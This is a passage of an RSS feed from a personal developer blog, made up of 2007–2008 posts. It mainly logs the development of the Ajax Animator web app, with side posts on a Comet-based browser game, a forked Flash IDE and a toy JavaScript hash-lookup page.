      <description>&lt;p&gt;The application is now HTML (I just added a doctype) and I changed the loading screen almost completely stolen from the Ext Samples page. (HTML Strict sort of broke the other one). I think one day, it’ll be XHTML. but now it’s just HTML Strict. Now it’s more descriptive. Saying “Loading UI…” and “Initializing…” rather than a simple “loading”. Its one of the ways to make it feel to load faster.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Status Fixing the compiler problem</title>
      <link>http://antimatter15.com/2008/06/status-fixing-the-compiler-problem/</link>
      <pubDate>Fri, 06 Jun 2008 21:14:35 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2008/06/status-fixing-the-compiler-problem/</guid>
      <author></author>
      <description>&lt;p&gt;I’ve located part of the problem. If I remove the reference to VMLRenderer.js, it suddenly starts working again. But how do I include it and get it to work still. I’m investigating.&lt;/p&gt;
&lt;p&gt;EDIT 1:&lt;/p&gt;
&lt;p&gt;Build 117 fixes the problem completely. it was simply because of mis-arrangement of the files. It was originally.&lt;/p&gt;
&lt;p&gt;&lt;pre class=&quot;csharpcode&quot;&gt;…
  &lt;span class=&quot;kwrd&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;html&quot;&gt;script&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;kwrd&quot;&gt;=”text/javascript”&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;src&lt;/span&gt;&lt;span class=&quot;kwrd&quot;&gt;=”../js/drawing/onlypaths.js”&lt;/span&gt;&lt;span class=&quot;kwrd&quot;&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;html&quot;&gt;script&lt;/span&gt;&lt;span class=&quot;kwrd&quot;&gt;&amp;gt;&lt;/span&gt;&lt;/pre&gt;&lt;/p&gt;
&lt;p&gt;&lt;pre class=&quot;csharpcode&quot;&gt;  &amp;lt;script type=&lt;span class=&quot;str&quot;&gt;“text/javascript”&lt;/span&gt; src=&lt;span class=&quot;str&quot;&gt;“../js/drawing/wrapper.js”&lt;/span&gt;&amp;gt;&lt;span class=&quot;kwrd&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;html&quot;&gt;script&lt;/span&gt;&lt;span class=&quot;kwrd&quot;&gt;&amp;gt;&lt;/span&gt; 
  &amp;lt;script type=&lt;span class=&quot;str&quot;&gt;“text/javascript”&lt;/span&gt; src=&lt;span class=&quot;str&quot;&gt;“../js/drawing/svgrenderer.js”&lt;/span&gt;&amp;gt;&amp;lt;/script&amp;gt;
  &amp;lt;script type=&lt;span class=&quot;str&quot;&gt;“text/javascript”&lt;/span&gt; src=&lt;span class=&quot;str&quot;&gt;“../js/drawing/vmlrenderer.js”&lt;/span&gt;&amp;gt;&amp;lt;/script&amp;gt;
…&lt;/pre&gt;&lt;/p&gt;
&lt;p&gt;&lt;pre class=&quot;csharpcode&quot;&gt;&lt;/pre&gt;
for some reason, this messed up the compilier. I changed it to.&lt;/p&gt;
&lt;p&gt;&lt;pre class=&quot;csharpcode&quot;&gt;  &lt;span class=&quot;kwrd&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;html&quot;&gt;script&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;kwrd&quot;&gt;=”text/javascript”&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;src&lt;/span&gt;&lt;span class=&quot;kwrd&quot;&gt;=”../js/drawing/onlypaths.js”&lt;/span&gt;&lt;span class=&quot;kwrd&quot;&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;html&quot;&gt;script&lt;/span&gt;&lt;span class=&quot;kwrd&quot;&gt;&amp;gt;&lt;/span&gt;
  &amp;lt;script type=&lt;span class=&quot;str&quot;&gt;“text/javascript”&lt;/span&gt; src=&lt;span class=&quot;str&quot;&gt;“../js/drawing/svgrenderer.js”&lt;/span&gt;&amp;gt;&amp;lt;/script&amp;gt;
  &amp;lt;script type=&lt;span class=&quot;str&quot;&gt;“text/javascript”&lt;/span&gt; src=&lt;span class=&quot;str&quot;&gt;“../js/drawing/vmlrenderer.js”&lt;/span&gt;&amp;gt;&amp;lt;/script&amp;gt;
  &amp;lt;script type=&lt;span class=&quot;str&quot;&gt;“text/javascript”&lt;/span&gt; src=&lt;span class=&quot;str&quot;&gt;“../js/drawing/wrapper.js”&lt;/span&gt;&amp;gt;&lt;span class=&quot;kwrd&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;html&quot;&gt;script&lt;/span&gt;&lt;span class=&quot;kwrd&quot;&gt;&amp;gt;&lt;/span&gt;&lt;/pre&gt;&lt;/p&gt;
&lt;p&gt;&lt;pre class=&quot;csharpcode&quot;&gt;&lt;/pre&gt;
&lt;span class=&quot;kwrd&quot;&gt;and now it works fine :) &lt;/span&gt;&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Sourceforge</title>
      <link>http://antimatter15.com/2008/05/sourceforge/</link>
      <pubDate>Wed, 28 May 2008 23:02:17 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2008/05/sourceforge/</guid>
      <author></author>
      <description>&lt;p&gt;I’ve gotten a sourceforge page for the project: &lt;a href=&quot;http://sourceforge.net/projects/ajaxanimator&quot;&gt;http://sourceforge.net/projects/ajaxanimator&lt;/a&gt; and the site is at &lt;a href=&quot;http://ajaxanimator.sf.net/&quot;&gt;http://ajaxanimator.sf.net/&lt;/a&gt; where you can browse the latest source code. I’ll probably still use Google Code, and i’ll probably also use Google App Engine and sourceforge together.&lt;/p&gt;
&lt;p&gt;And that Google Ajax Libraries thing looks pretty nice. Can’t wait till it supports Ext.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Build 99</title>
      <link>http://antimatter15.com/2008/05/build-99/</link>
      <pubDate>Tue, 27 May 2008 01:45:17 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2008/05/build-99/</guid>
      <author></author>
      <description>&lt;p&gt;Its now at Build 99. I feel that not much more can be done without the critical OnlyPaths component. I don’t have anything ready yet. An Ext port of OnlyPaths is underway, but it is not necessarily very stable, and some critical features (cross-platform drawing API) is not completed yet.&lt;/p&gt;
&lt;p&gt;I rolled back one thing yesterday: the Advanced Color-Picker tool. They &lt;em&gt;will&lt;/em&gt; be added again later, but I don’t want to aim &lt;em&gt;too&lt;/em&gt; high for the initial 0.20 release, or else it may never get released. The standard (albeit small) color picking system is fine for now. It also is quite big, so not yet.&lt;/p&gt;
&lt;p&gt;IE and Opera should work flawlessly now (Aside from browser-limitations). Most problems in the app are caused by those annoying commas in JSON errors (IE/Opera don’t like it when its {blah:stuff,super:happy&lt;strong&gt;&lt;span style=&quot;text-decoration: underline;&quot;&gt;,&lt;/span&gt;&lt;/strong&gt;})&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Today's Updates</title>
      <link>http://antimatter15.com/2008/05/today-s-updates/</link>
      <pubDate>Mon, 26 May 2008 07:37:18 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2008/05/today-s-updates/</guid>
      <author></author>
      <description>&lt;p&gt;It’s still 11:35 AM here, so this is likely not all that will be here today. But there are some great new features today. Renaming the layers through the GUI will actually rename layers in the back-end too. There is a combobox for the zoom sizes in both the canvas and preview tabs. There is now a slider for adjusting line width on the panel.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Today's Updates III</title>
      <link>http://antimatter15.com/2008/05/today-s-updates-iii/</link>
      <pubDate>Mon, 26 May 2008 04:07:25 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2008/05/today-s-updates-iii/</guid>
      <author></author>
      <description>&lt;p&gt;I added the beginnings of the Users system. There is an accordian panel for switching between Register and Login. The Login panel has the standard Username and Password (labeled User/Pass). The Registration panel is the same, with 2 instances of “Pass”. As every other panel in the app, there are nice little silk icons that accompany them.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Today's Updates II</title>
      <link>http://antimatter15.com/2008/05/today-s-updates-ii/</link>
      <pubDate>Mon, 26 May 2008 02:55:53 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2008/05/today-s-updates-ii/</guid>
      <author></author>
      <description>&lt;p&gt;As I mentioned earlier, more would happen today. I’ve just made an update. I updated the Update system to also compile (it doesn’t compress anything yet, it really doesn’t need to) CSS files. This should speed up the application a bit, and should also make it easier when updating some smaller things. As with that, it will also starting from build 83, create release archives of the CSS files. The compiler mechanism has changed a bit too, but that’s not really important.&lt;/p&gt;
&lt;p&gt;The most visible additions, is the embedded Color Dialog. If you look at the title, you’ll find a Steve Jobs reference. Right below the huge drawing tools list (what? is it like 2 times that of the old version?) there is a Line Width slider (this is indirectly inspired by OnlyPath’s Mondrian-style color picker). it also embeds the Color Field plugin, so if you press the little button on the side, a little color palette shows up. Ideally, this will enhance user’s efficiency and be less confusing than the old one.&lt;/p&gt;
&lt;p&gt;I don’t know if I can make a “Today’s Updates III” :P&lt;/p&gt;
&lt;p&gt;[EDIT] BTW, the page is located at&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://antimatter15.110mb.com/animator/Animator2/build/ajaxanimator.htm&quot; title=&quot;http://antimatter15.110mb.com/animator/Animator2/build/ajaxanimator.htm&quot;&gt;http://antimatter15.110mb.com/animator/Animator2/build/ajaxanimator.htm&lt;/a&gt;&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Starting Over</title>
      <link>http://antimatter15.com/2008/05/starting-over/</link>
      <pubDate>Sun, 25 May 2008 06:51:56 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2008/05/starting-over/</guid>
      <author></author>
      <description>&lt;p&gt;Today, I’ve launched the new site. My new blog. We’re starting over. I don’t know what to do exactly. I just hope that everyone can adjust to this new site. I like it more, it may be somewhat faster - at least my spam problem will be fixed.&lt;/p&gt;
&lt;p&gt;If you still wan to visit the old site, feel free to do so at &lt;a href=&quot;http://antimatter15.110mb.com/phpfusion&quot;&gt;http://antimatter15.110mb.com/phpfusion&lt;/a&gt; everything will still be perfectly accessible, and feel free to register there. If this doesn’t work out, i could revert back to phpfusion. But I think the move is for the better.&lt;/p&gt;
&lt;p&gt;Please, Really, post your thoughts as a comment to this post. Please, I beg of you.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>About</title>
      <link>http://antimatter15.com/2008/05/about/</link>
      <pubDate>Wed, 07 May 2008 17:50:28 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2008/05/about/</guid>
      <author></author>
      <description>&lt;p&gt;I’m really not that interesting. This blog is just a place where I talk about random ideas or projects like just about everyone else.&lt;/p&gt;
&lt;!--more--&gt;

&lt;p&gt;I’ve never really been into talking about myself, rather just the stuff I do or think. I may be somewhat paranoid, or whatever.  I think I’m an &lt;a href=&quot;http://en.wikipedia.org/wiki/INTP&quot;&gt;INTP&lt;/a&gt; but I’m not too certain (could my subconscious be deceiving me?).&lt;/p&gt;
&lt;p&gt;If you’re more interested on the history of this blog, well, it started a long time ago. I started with &lt;a href=&quot;http://php-fusion.co.uk/news.php&quot;&gt;phpfusion&lt;/a&gt; as my CMS (and &lt;a href=&quot;http://110mb.com&quot;&gt;110mb&lt;/a&gt; as my host) back in late May 2007, and switched to &lt;a href=&quot;http://wordpress.org&quot;&gt;WordPress&lt;/a&gt; and &lt;a href=&quot;http://phpbb.org/&quot;&gt;phpBB&lt;/a&gt; in mid-2008. Later the year, I got a new web host, &lt;a title=&quot;THIS HOST SUCKS!&quot; href=&quot;http://godaddy.com&quot;&gt;GoDaddy&lt;/a&gt;, but the blog didn’t migrate there. Just a few days later I switched from phpBB to &lt;a href=&quot;http://bbpress.org&quot;&gt;BBPress&lt;/a&gt;. From then to Mid-July 2009, I upgraded to WordPress 2.8 and migrated to a &lt;a href=&quot;http://dreamhost.com&quot;&gt;new host&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;This blog initially was for the sole purpose of hosting changelogs for the Ajax Animator project (which itself began sometime before March of 2007).&lt;/p&gt;
&lt;p&gt;Before this blog, I had several sites starting with a simple Google Page Creator one from 2005. After that I made a &lt;a href=&quot;http://www.jupiterportal.org/&quot;&gt;Jupiter CMS&lt;/a&gt; powered site and later used &lt;a href=&quot;http://joomla.org&quot;&gt;Joomla&lt;/a&gt; after experimenting with &lt;a href=&quot;http://drupal.org&quot;&gt;Drupal&lt;/a&gt;. After moving to 110mb, I used &lt;a href=&quot;http://php-fusion.co.uk/news.php&quot;&gt;phpfusion&lt;/a&gt; because people on the forums seem to like it. Now I’m on wordpress (and repeating whatever I wrote 2 paragraphs above)!&lt;/p&gt;
&lt;p&gt;If you want to contact me, my email’s &lt;strong&gt;antimatter15@gmail.com&lt;/strong&gt; I’d really appreciate it if nobody sent spambots after me. You can follow me on Twitter at &lt;a href=&quot;http://twitter.com/antimatter15&quot;&gt;@antimatter15&lt;/a&gt; or on &lt;a href=&quot;https://plus.google.com/116347431032639424492/about&quot;&gt;Google+&lt;/a&gt;.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Hello world!</title>
      <link>http://antimatter15.com/2008/05/hello-world/</link>
      <pubDate>Wed, 07 May 2008 01:50:28 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2008/05/hello-world/</guid>
      <author></author>
      <description>&lt;p&gt;Welcome to WordPress. This is your first post. Edit or delete it, then start blogging!&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;I’ve decided to keep this, it’s a nice marker of when exactly this blog transitioned to a different platform.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Updates Today</title>
      <link>http://antimatter15.com/2008/05/updates-today/</link>
      <pubDate>Tue, 06 May 2008 03:20:26 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2008/05/updates-today/</guid>
      <author></author>
      <description>&lt;p&gt;&lt;a href=&quot;http://antimatter15.110mb.com/animator/Animator2/build/ajaxanimator.htm&quot;&gt;http://antimatter15.110mb.com/animator/Animator2/build/ajaxanimator.htm&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Now, its at Ajax Animator Build 48. It has an improved “Properties” menu. The Drawing icons have been updated (to give you a taste of features of OnlyPaths that will be added). Notice that there are some features left out. Zoom will be done via the zoom button on the canvas toolbar, and panning won’t be necessary. I’m curious of whether I should or should not include the z-index ordering. Simply, the whole purpose of layers is that. and Layers seem much more managable, visible, and such.&lt;/p&gt;
&lt;p&gt;Speaking of layers, the Layer browser part of the timeline has been added. It is currently just a simple Editor Grid (so you can inline edit the label!).  I’m going to add &lt;a href=&quot;http://cellactions.extjs.eu/&quot;&gt;http://cellactions.extjs.eu/&lt;/a&gt; for the ability to remove/edit layers via a nice icon.&lt;/p&gt;
&lt;p&gt;I have also almost sucessfully ported OnlyPaths to ExtJS. it turns out, that all prototype code is in richdraw.js, and it is as simple as replacing prototype code with Extjs counterparts.&lt;/p&gt;
&lt;p&gt;such as
this.blahlistener = this.blah.bindAsListener(this)
Event.observe(this.explosion, “mouseexplode”, this.blahlistener)&lt;/p&gt;
&lt;p&gt;becomes
Ext.get(this.explosion).on(“mouseexplode”,this.blah,this);&lt;/p&gt;
&lt;p&gt;Often, Ext code is simpler, and more consise, but other times it is not so.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Small Updates</title>
      <link>http://antimatter15.com/2008/05/small-updates/</link>
      <pubDate>Mon, 05 May 2008 03:20:05 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2008/05/small-updates/</guid>
      <author></author>
      <description>&lt;p&gt;today was just a few fixes, a pseudo-key-guide thing ported from the current stable one, and some minor updates. I included the Ext.ux.ColorPicker, and I guess i’ll work on porting OnlyPaths to Ext soon (it currently uses Prototype). I’m probably not going to include Prototype because OnlyPaths is a &lt;em&gt;much&lt;/em&gt; (~11x) larger project than RichDraw, and therefore, it is mainly out of trying to improve size. (the project is currently ~20kb, but with onlypaths, will become ~100kb, plus ExtJS, will be ~1mb)&lt;/p&gt;
&lt;p&gt;I might set up a blag and a separate site for the Ajax Animator (based off my alpha site from last release). I’m thinking of using WordPress/PHPBB but idk&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Experimental Comet MMORPG</title>
      <link>http://antimatter15.com/2008/05/experimental-comet-mmorpg/</link>
      <pubDate>Fri, 02 May 2008 03:19:38 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2008/05/experimental-comet-mmorpg/</guid>
      <author></author>
      <description>&lt;p&gt;Note: This is likely the first AND last release Ever. I’m gonna go on working on Ax v0.2 after this is finished (tomorrow)&lt;/p&gt;
&lt;p&gt;I think its finally &lt;em&gt;ready&lt;/em&gt; for showing people (still proprietary though :P). It is coded using Ajax/Long-Polling Comet, which as far as I’m concerned, is the first of it’s kind. It uses ExtJS for its user interface. it’s page load is ~2mb in size, and there is a huge amount of static data handled. Its following how most my apps are made: using the most client side code possible. I donno why, but it just is.&lt;/p&gt;
&lt;p&gt;Since it uses Comet technology (specifically, long-polling), the requests made are minimized, and supposedly much more scalable. Requests are &lt;em&gt;only&lt;/em&gt; made when necessary, and due to Comet technology, it only updates when there is something to update.&lt;/p&gt;
&lt;p&gt;Since most of the processing is done on the client side, the server only has to handle the static content.&lt;/p&gt;
&lt;p&gt;An interesting, albeit geeky feature, is a sort of command-line functionality. I attempted to build the entire system (somewhat like a Unix system) where most if not everything graphical is backed by a set of commands. Well, the real-time chatbox (which again, uses comet to reduce load on servers) detects if the input starts with the &amp;gt; character. if it does, then it parses it as a set of commands. Its relatively smart, so if you type in a global variable name, i’ll give you a JSON dump of the contents, and if its a function, i’ll call it, and if it is an expression then it’ll eval it.&lt;/p&gt;
&lt;p&gt;There is no such plotline yet. Just random stuff that pops in my head (read: iWorld) and etc. there is also no title yet. (named: “Untitled”). Part of the game itself, is to build the game, using its built-in pixel-sprite-graphics editor.&lt;/p&gt;
&lt;p&gt;Currently, it is restricted to modern browsers only. Firefox being my development platform (duh. what kind of js developer doesn’t use firefox/firebug? but i heard the IE8 dev toolbar is good cause its a clone of firebug..) will obviously work best. IE may or may not work. though platform agnosticism was one of the design goals. Opera/Safari is likely, but i’m not certain. most mobile browsers will fail (i tried apple iphone safari support, but it is weird around ExtJS)&lt;/p&gt;
&lt;p&gt;It has some features, such as a relatively nice UI (well… nice compared to the &lt;em&gt;others&lt;/em&gt;).  Session saving, worlds, sprite/npc authoring, Character IDE, npc battles, pvp, store, panning, prelimary quests,  items, friends, magic/abilities, a CLI, some crappy code, moderation, adminstration, etc.&lt;/p&gt;
&lt;p&gt;Oh, and the password is “password” in case you wanna make new sprites.  The URL is &lt;a href=&quot;http://cometrpg.110mb.com/&quot;&gt;http://cometrpg.110mb.com/&lt;/a&gt;&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Today's (Tiny) Updates</title>
      <link>http://antimatter15.com/2008/04/today-s-tiny-updates/</link>
      <pubDate>Wed, 30 Apr 2008 03:19:19 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2008/04/today-s-tiny-updates/</guid>
      <author></author>
      <description>&lt;p&gt;Really, nothing much. There are some corrections to the About page, and some more icons. There is also a non-working Bug-Reporting tool.&lt;/p&gt;
&lt;p&gt;I will try adding OnlyPaths soon, but it still needs much work. (and it’s Build 40 now!!!)&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Desktop Flash IDE ForkSwif Released</title>
      <link>http://antimatter15.com/2008/01/desktop-flash-ide-forkswif-released/</link>
      <pubDate>Wed, 23 Jan 2008 01:05:52 -0500</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2008/01/desktop-flash-ide-forkswif-released/</guid>
      <author></author>
      <description>&lt;p&gt;This was a really small project of mine. It is (going to be) open source, but I’ll probably never work on it again. It has a much larger number of tools than Ajax animator. The editing will be much a relief, and so much better than rich draw. Sadly, it has no tweening, frame duplicating, effects, or any of the features in Ajax animator.&lt;/p&gt;
&lt;p&gt;It is currently only for Windows with .net framework 2.0 installed, Mono/Wine is not tested (but Mono has to be used with wine, as it calls swfmill.exe (win32 binary) for flash generation.&lt;/p&gt;
&lt;p&gt;About the name:Liveswif has been a great piece of software, probably the best (free) flash IDE ever. Sadly, it has been discontinued for since years ago. The community has been working on something called “OpenSwif” it was supposed to be the successor to the famed liveswif. The problems were, that liveswif was proprietary (freeware), so they had no codebase to begin on. Ajax Animator started out as something for the developers of OpenSwif to get inspiration off of, and just one of my random ideas. As of now, OpenSwif still has no released imagery/source/binaries; there is only one developer, and no signs of active development. I just decided one day, discovering some information to be mentioned in the next paragraph, that I could really do things a lot better than they were doing now. I, for once, actually utilized the wonders of open source, forking. As everyone on the OpenSwif team were acting as if OpenSwif was proprietary.&lt;/p&gt;
&lt;p&gt;I, reading up on swfmill, discovered it had something called SVG import, meaning, it could read a svg file to convert into SWF. With this realization, I quickly searched VB.NET (my first programming language, btw, but I like JS more now) SVG Editor. Too much dismay, no VB.NET SVG editors existed, but I found one coded in C#. I made a TODO list that basically said: Make Timeline, Attach Timeline, Hack SVG Paint, and attach Swfmill. It was with much less work than I expected. Being a crappy c# coder, I made most of it in VB.net, and converted it to c# (using online tools). The timeline was pretty easy (20 lines of vb code), which fit easily on the SVGPaint layout. Then I hacked the saving mechanism to save automatically (without user interference), which was as simple as deleting all the references to message boxes (well, in docmanager.cs). I built a quick and dirty swfmill launcher program that generated the necessary markup. And sadly, it didn’t work. After a bit of experimentation, I discovered that you have to attach an ID to every svg element, which the program didn’t do. I just had to add “id=shape”+rand.Next(9999999).toString() somewhere and voila, I finished the flash ide. All in less than 50 lines of code. Now all I needed to do is to rebrand it (evilest, no…um… I mean easiest part).&lt;/p&gt;
&lt;p&gt;In retrospect, I probably wrote more in this essay (article or whatever) than all the work I spent on the ForkSwif project.&lt;/p&gt;
&lt;p&gt;Read more at:&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://www.pryjon.com/liveswifers/forums/viewtopic.php?t=1377&quot;&gt;http://www.pryjon.com/liveswifers/forums/viewtopic.php?t=1377&lt;/a&gt;
&lt;a href=&quot;http://www.pryjon.com/liveswifers/forums/viewtopic.php?t=1364&quot;&gt;http://www.pryjon.com/liveswifers/forums/viewtopic.php?t=1364&lt;/a&gt;
&lt;a href=&quot;http://code.google.com/p/forkswif/&quot;&gt;http://code.google.com/p/forkswif/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;What the heck is wrong with me and writing such long essays for random news topics?!?! I should spend this effort on homework…..&lt;/p&gt;
</description>
    </item>
    <item>
      <title>New Features coming in Ajax Animator 0.15 (aka 1.5, read to find out why)</title>
      <link>http://antimatter15.com/2007/12/new-features-coming-in-ajax-animator-0-15-aka-1-5-read-to-find-out-why/</link>
      <pubDate>Sat, 01 Dec 2007 22:12:29 -0500</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2007/12/new-features-coming-in-ajax-animator-0-15-aka-1-5-read-to-find-out-why/</guid>
      <author></author>
      <description>&lt;p&gt;&lt;span class=&quot;postbody&quot;&gt;Okay, so one day i felt crazy and changed everything by 1 decimal place because i don’t want this to seem misleadingly good. I mean, if it hits a 1.0 release, then some people would think it’s almost as good as Flash 1 (futuresplash animator) which it it isn’t even near yet.&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;So it should be 1.5 but now it’s 0.15 :D&lt;/p&gt;
&lt;p&gt;Read more to find out the whole list, a summary of it would be axml2, UI polishing, save space, nicer code (but still hideous), css, users, tweening, finish partially completed ideas etc.&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;postbody&quot;&gt;What’s done so far &lt;/span&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Redesigned Register UI&lt;/li&gt;
&lt;li&gt;Save Lots of code&lt;/li&gt;
&lt;li&gt;New Save/Open file format (around 5x faster, and 10 times smaller)&lt;/li&gt;
&lt;li&gt;Relocating stuff&lt;/li&gt;
&lt;li&gt;interactive tutorials&lt;/li&gt;
&lt;li&gt;Backwards Compat Mode&lt;/li&gt;
&lt;li&gt;for the first time it’s gonna be a legitimate GPLv2 project (I’m gonna include the gpl.txt file for once)&lt;/li&gt;
&lt;li&gt;replaced wz_tooltips with native ext.js ones&lt;/li&gt;
&lt;li&gt;Change save file to computer architecture&lt;/li&gt;
&lt;li&gt;change organization of Save/Open buttons in file menu (submenus)&lt;/li&gt;
&lt;li&gt;optimized stuff&lt;/li&gt;
&lt;li&gt;fixed bugs&lt;/li&gt;
&lt;li&gt;No more save/open window (now, single-purpose dialog alerts, much better)&lt;/li&gt;
&lt;li&gt;Progress bars&lt;/li&gt;
&lt;li&gt;User friendly upload error message (yay!)&lt;/li&gt;
&lt;li&gt;relocate css&lt;/li&gt;
&lt;li&gt;delete lot’s of stuff from user-management&lt;/li&gt;
&lt;li&gt;REAL SUPPORT FOR LINES/ELLIPSES, lines didn’t work for tweening, ellipses didn’t work for tweening or flash, and ALL suffered from a programming error causing line-widths to be messed up.&lt;/li&gt;
&lt;li&gt;FastMode
…and more to come&lt;/li&gt;
&lt;/ul&gt;
</description>
    </item>
    <item>
      <title>Note to self</title>
      <link>http://antimatter15.com/2007/11/note-to-self/</link>
      <pubDate>Fri, 23 Nov 2007 06:18:25 -0500</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2007/11/note-to-self/</guid>
      <author></author>
      <description>&lt;p&gt;note to self&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Format of new Ajax Animator Interactive Tutorials</title>
      <link>http://antimatter15.com/2007/11/format-of-new-ajax-animator-interactive-tutorials/</link>
      <pubDate>Fri, 23 Nov 2007 05:27:42 -0500</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2007/11/format-of-new-ajax-animator-interactive-tutorials/</guid>
      <author></author>
      <description>&lt;p&gt;In a comming version, a new function, would be to have interactive tutorials, where friendly arrows tell you where to click, drag, etc.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>New File Format</title>
      <link>http://antimatter15.com/2007/11/new-file-format/</link>
      <pubDate>Fri, 16 Nov 2007 22:01:56 -0500</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2007/11/new-file-format/</guid>
      <author></author>
      <description>&lt;p&gt;I’m working on a better save/preview file format, even merging the save/preview formats into one.&lt;/p&gt;
&lt;p&gt;it’s just a string seperated by “;;” before it, is a standard JSON Array. After, is the standard XML compiler stuff. the json has info like framerate,height,width,current frame, tweens, keyframes, animation length, comments?, rating?, size? etc.&lt;/p&gt;
&lt;p&gt;the javascript save/load implementation is so far done.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>To Self Fixed Timeline2.js</title>
      <link>http://antimatter15.com/2007/11/to-self-fixed-timeline2-js/</link>
      <pubDate>Mon, 12 Nov 2007 05:27:15 -0500</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2007/11/to-self-fixed-timeline2-js/</guid>
      <author></author>
      <description>&lt;p&gt;To Self: Fixed Timeline2.js to make keyframe stuph work&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Progress Report</title>
      <link>http://antimatter15.com/2007/10/progress-report/</link>
      <pubDate>Mon, 22 Oct 2007 06:06:56 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2007/10/progress-report/</guid>
      <author></author>
      <description>&lt;p&gt;I’ve not been releasing anything for a while, for several reasons:&lt;/p&gt;
&lt;p&gt;1. I’m converting everything to the Ext UI (from textareas, tables, etc. to Ext grids, form fields)
2. I’m completely rewriting the timeline. including a host of new features much for speed. (several TIMES faster) mainly becuase it generates only 300 frames per layer by default, instead of 500, but automatically adds new frames DYNAMICALLY when more is needed. But the rewrite is sorta unstable
3. Tons of UI upgrades. A short list of changes from the top of my head are, a new login stystem (lot’s of fading effects) My Animations; list, faster animation loading. The user animation browser is completely changed-with stuff like Rating animations and comments coming.
4. Sorta goes in UI upgrades, is a new loading splash screen. It has a progress bar, showing status. And CSS is dynamically added, and loads from either the local server, or google code’s subversion (faster).
5. Cross Domain Ajax. The current ajax implementation only allows you to generate flash animations if you are on a php server with all the libraries/files installed. And sometimes you go to it from a proxy or google code beta or something. If that happens, you will not have any access to creating flash animations. So, soon it will curcumvent this restriction, by using a script tag hack, to load the animations from the server. Though the current ajax implementation will still be used for larger animations. And i might revive animation compression for this purpose.
6. Upgrading to Ext 2.0, this is not really happening NOW, but is being actively thought of. It’s not really a “painless” upgrade, with lot’s of stuff to modify/rewrite.
7. Everything has two options. One is to load from subversion, or the local server. It’s better if you load it from subversion, if you are mirroring it, or if your server is slow. And in many cases it’s really fast, and automatically gzip encodes the stuff. Great isnt it? so it has an option of loading all* (okay, most…) images and CSS from google code.&lt;/p&gt;
&lt;p&gt;8. And even more stuff……&lt;/p&gt;
</description>
    </item>
    <item>
      <title>MD5/SHA1 Pure Javascript Hash Cracking</title>
      <link>http://antimatter15.com/2007/10/md5-sha1-pure-javascript-hash-cracking/</link>
      <pubDate>Tue, 09 Oct 2007 22:13:48 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2007/10/md5-sha1-pure-javascript-hash-cracking/</guid>
      <author></author>
      <description>&lt;p&gt;All client side sha1/md5 hash cracking using a rainbow table type system. capable of cracking all lowercase alphanumberic hashes under 3 letters in length.&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://antimatter15.com/2007/misc/md5.htm&quot;&gt;http://antimatter15.110mb.com/misc/md5.htm&lt;/a&gt;
&lt;a href=&quot;http://antimatter15.com/2007/misc/sha1.htm&quot;&gt;http://antimatter15.110mb.com/misc/sha1.htm&lt;/a&gt;&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Some Progress</title>
      <link>http://antimatter15.com/2007/09/some-progress/</link>
      <pubDate>Sun, 30 Sep 2007 23:42:08 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2007/09/some-progress/</guid>
      <author></author>
